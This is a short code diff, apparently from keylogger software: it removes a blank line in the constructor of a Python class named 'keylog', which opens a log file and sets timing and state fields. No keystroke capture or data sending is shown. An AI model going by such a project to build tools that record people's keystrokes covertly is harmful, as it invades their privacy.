@@ -12,7 +12,6 @@ class keylog:
         open(file, "w+")
         self.time = time
         self.log = ""
-
         self.on = False
 
     def start(self):
